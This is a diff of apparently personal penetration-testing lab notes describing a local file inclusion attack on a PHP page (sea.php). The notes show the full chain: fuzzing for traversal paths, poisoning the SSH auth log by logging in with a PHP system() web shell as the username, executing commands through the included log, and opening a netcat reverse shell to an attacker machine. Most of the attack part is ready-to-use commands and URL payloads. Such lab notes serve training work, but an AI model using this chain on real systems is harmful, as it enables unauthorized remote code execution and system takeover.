@@ -234,22 +234,27 @@ ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /seclists/Fuzzing/LFI/LFI-J
 
 the ../../../../ can be run with different deepness for different files up to 10
 
-passing the final path to burp repeater
+Type into URL
 http://192.168.56.113/sea.php?file=../../../../var/log/auth
 
 Look for logs with SSH logins or another other logins that are being logged
-ssh hello@@192.168.1.136 to check if it logs
+ssh hello@@192.168.1.136 to check if it logs the ssh login on the above prev URL
 
-Replace the username (hello) with a php shell and try to login it will get into the log file and when we load the log file through our sea.php if the system() function for php is available it will process the php code that loaded from logs
-
+Replace the username (hello) with a php system command or an nc check and when we load the log file through our sea.php if the system() function for php is available it will process the php code that loaded from logs
 ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
+/sea.php?file=../../../../var/log/auth&cmd=ls
 
-On burp suite : /sea.php?file=../../../../var/log/auth&cmd=ls
+ssh 'which+nc' @192.168.1.136
+/sea.php?file=../../../../var/log/auth&cmd=ls
+
+On URL : /sea.php?file=../../../../var/log/auth&cmd=ls
 If the remote code worked then you can inject a reverse shell
 
 /usr/bin/nc 192.168.1.106 4848 -e /bin/sh
+USE AS
 /sea.php?file=../../../../var/log/auth&cmd=/usr/bin/nc+192.168.1.106+4848+-e+/bin/sh
 
+connect with listener on kali
 ```
 
 
